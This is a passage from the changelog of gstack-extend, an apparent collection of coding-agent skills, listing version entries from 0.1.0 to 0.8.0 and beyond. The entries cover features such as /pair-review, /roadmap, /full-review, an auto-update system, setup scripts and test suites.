- Future-only roadmap support: `check_structure()` and `detect_mode()` recognize ROADMAP.md with only a `## Future` section as valid (triage mode, not overhaul).
- Triage mode phase integration: new inbox items get phase-assigned before Group/Track placement.
- 9 new tests (37 total): contextual Phase vocab lint (6), Future section structure (2), Future-only mode detection (1).

### Changed
- Tighter `## Future` heading match in audit script (`^## Future($| \()`) to avoid matching `## Futures` or `## Future Work`.
- Triage mode sub-steps renumbered (3a-3f) to reflect new Step 2 insertion.
- Rule 8 updated: Unprocessed items are now drained by triage (Step 2), not preserved during overhaul.

## [0.8.0] - 2026-04-06

### Added
- New `/full-review` skill: weekly codebase review pipeline with 3 specialized agents (reviewer, hygiene, consistency-auditor) dispatched in parallel. Root-cause clustering synthesizes findings into actionable clusters for human triage (approve/reject/defer). Approved findings written to TODOS.md as `[full-review]` source-tagged items. Dedup against ROADMAP.md prevents re-flagging tracked issues. Incremental state checkpointing for resume support. Designed to feed into `/roadmap` for execution topology.

## [0.7.0] - 2026-04-06

### Added
- New `/roadmap` skill for documentation restructuring. Reorganizes project docs into Groups > Tracks > Tasks with dependency-chain ordering and file-ownership grouping for parallel agent execution.
- Deterministic audit script (`bin/roadmap-audit`) with 8 checks: vocabulary lint, structure validation, staleness detection, version audit, taxonomy check, dependency integrity, unprocessed item detection, and mode detection.
- Two-mode behavior: overhaul (first run, full restructure) and triage (process only new items from the inbox).
- TODOS.md/ROADMAP.md split: TODOS.md is now a pure inbox where other skills dump unprocessed items. ROADMAP.md is the structured execution plan owned by `/roadmap`.
- `/pair-review` now writes bugs to TODOS.md's `## Unprocessed` section with `[pair-review]` source tags.
- Shared semver comparison library (`bin/lib/semver.sh`) extracted from `bin/update-check`.
- 28 new tests for the audit script (`scripts/test-roadmap-audit.sh`).

## [0.6.3] - 2026-04-06

### Changed
- `/browse-native` is now opt-in (beta). Default `./setup` only installs `/pair-review`. Use `./setup --with-native` to also install browse-native.
- README updated with skill maturity status table and separate beta install instructions.
- Setup script rejects unknown flags instead of silently falling through to default install.

## [0.6.2] - 2026-04-05

### Fixed
- `bin/update-run` no longer destroys non-main branch work. Replaced `git reset --hard origin/main` with `checkout main` + `pull --ff-only`. Safely switches back to the original branch after upgrade, restores stashed changes on the correct branch, and fails safely if main has diverged locally.
- Skill preamble update-check guard now fires regardless of where the repo is cloned. Replaced `$HOME/.claude/skills/` path prefix check with `[ -x "$_EXTEND_ROOT/bin/update-check" ]`.

### Added
- Smart next-step suggestion at pair-review completion. Checks `gstack-review-read` for existing review logs and diff size against main. If no review has been run and changes exceed 30 lines, nudges toward `/review` before `/ship`. Trivial changes or already-reviewed branches go straight to `/ship`.
- Test suite for update and install pipeline (`scripts/test-update.sh`): 17 tests covering update-run (happy path, non-main branch switch, dirty worktree restore, ff-only failure, missing args) and setup (default install, uninstall).

## [0.6.1] - 2026-04-05

### Fixed
- Standardized /pair-review question presentation: all user-facing prompts now use AskUserQuestion with explicit options instead of free-form text. Eliminates inconsistent question styles across workspaces (yes/no vs pass/fail/skip vs multiple choice).
- Added Conductor visibility awareness: new "action receipt" pattern ensures important status updates (bug parked, fix committed, build succeeded) are included in the visible prompt, not hidden in collapsed intermediate messages.

### Added
- New "Conductor Visibility Rule" section in pair-review skill defining the AskUserQuestion-first and action receipt conventions.

## [0.6.0] - 2026-04-05

### Added
- Auto-update system for all skills. Skills check for new versions on each invocation via `bin/update-check` (private gist VERSION comparison, pure bash semver, 60min/720min cache TTL, escalating snooze backoff). Inline upgrade flow in each skill preamble: auto-upgrade if configured, otherwise AskUserQuestion with 4 options (upgrade now, always auto-upgrade, snooze, disable checks). `bin/update-run` handles the upgrade (git stash + fetch + reset --hard + setup). `bin/config` provides simple key=value config management. GitHub Action syncs VERSION to gist on push to main. Global-install only (per-project installs skip update checks). State stored in `~/.gstack-extend/`.

## [0.5.0] - 2026-04-05

### Added
- Bug parking for /pair-review: note unrelated bugs during testing without interrupting the flow. Bugs are parked to `parked-bugs.md`, triaged at group completion (fix now, defer to TODOS.md, or keep parked), and remaining bugs are processed in a post-testing fix queue (Phase 2.5). Designed to avoid `git add -u` sweeping TODOS.md changes into fix commits by deferring classification to group boundaries.

### Fixed
- Corrected TODOS.md path reference in Phase 1 test plan generation (was `TODOS.md`, now `docs/TODOS.md`).

## [0.4.1] - 2026-04-04

### Added
- Setup script (`setup`) for installing skill symlinks into `~/.claude/skills/`. Handles install and `--uninstall` with ownership verification (only removes symlinks it created).

### Changed
- Updated README installation instructions: two clear paths (global install and per-project install), both using the new setup script. Previously claimed skills were auto-discovered after cloning, which was incorrect.
- Renamed project from gstack-native to gstack-extend across all in-repo references: README, CLAUDE.md, setup script, design docs, and TODOS.

### Fixed
- Renamed pair-review skill's context directory from `.context/test-session/` to `.context/pair-review/` to match the skill name.

## [0.4.0] - 2026-04-04

### Added
- New /pair-review skill (skills/pair-review.md): pair testing session manager that guides humans through manual testing with persistent state. Generates grouped test plans from diffs, manages the test-fix-retest loop with group-level checkpoints, discovers deploy recipes, and supports cross-machine resume. Works for any project type (web, native, CLI).
- Design doc: docs/designs/pair-review.md (approved via /office-hours, reviewed via /plan-ceo-review and /plan-eng-review).
- Skill routing for /pair-review in CLAUDE.md.
- New TODOs: PR comment integration (P1), validation script (P1), multi-agent orchestration (P2), repo rename (P2).

## [0.3.1] - 2026-04-04

### Added
- Implementation guide for adding debug infrastructure to new SwiftUI apps (docs/debug-infrastructure-guide.md). Documents all six components from the reference implementation with code examples, wiring instructions, and a verification checklist.
- Skill now detects missing infrastructure at setup and guides users to add it before falling back to degraded mode. Explains what's lost without instrumentation and offers to help implement it (~400 lines Swift, ~15 min with CC).

### Changed
- Moved skill to `skills/browse-native.md` (preparing for multi-skill layout).
- Moved design docs to `docs/archive/` (historical decision records, not active references).
- Promoted implementation guide to `docs/` root (living reference used by the skill).

## [0.3.0] - 2026-04-04

### Changed
- Replaced Peekaboo CLI with inside-out debug infrastructure. The app now instruments itself (screenshots, layout probes, state dumps) and the agent communicates via filesystem triggers and osascript.
- Rewrote /browse-native skill around the new interaction pattern: trigger snapshot, read structured data + screenshots, act via osascript/keyboard, verify.
- Rewrote validation gates: Gate 1 validates snapshot bundles, Gate 2 tests osascript interaction, Gate 3 measures see-act-see cycle latency (<3000ms).
- Three instrumentation tiers: full (probes + state + screenshots), partial (state + screenshots), and degraded (osascript + screencapture only).
- Updated TODOS.md: obsoleted 5 Peekaboo-era items, added new P1/P2 backlog.
- Updated roadmap: Phase 2 is now UI Truth Layer, Phase 3 is /qa-native redesign.

### Added
- Design doc: docs/archive/inside-out-debugging.md (approved, covers snapshot bundle spec, trigger protocol, osascript primitives, architectural decisions).
- Color and alignment rules: skill instructs the agent to always use probe data for precise comparisons, never rely on screenshot vision alone.
- Degraded mode: skill works with uninstrumented apps via osascript + screencapture.
- Skill routing rules in CLAUDE.md.

### Removed
- Peekaboo CLI dependency. No external tools required.
- scripts/detect-host-app.sh (Peekaboo permission detection).

## [0.2.0] - 2026-03-27

### Changed
- Skill rewrite from hands-on feedback: focused interaction tool, mandatory target, capability probe, keyboard-first mode for sparse AX trees.

## [0.1.0] - 2026-03-24

### Added
- Initial /browse-native skill with Peekaboo CLI, validation gates, design doc.
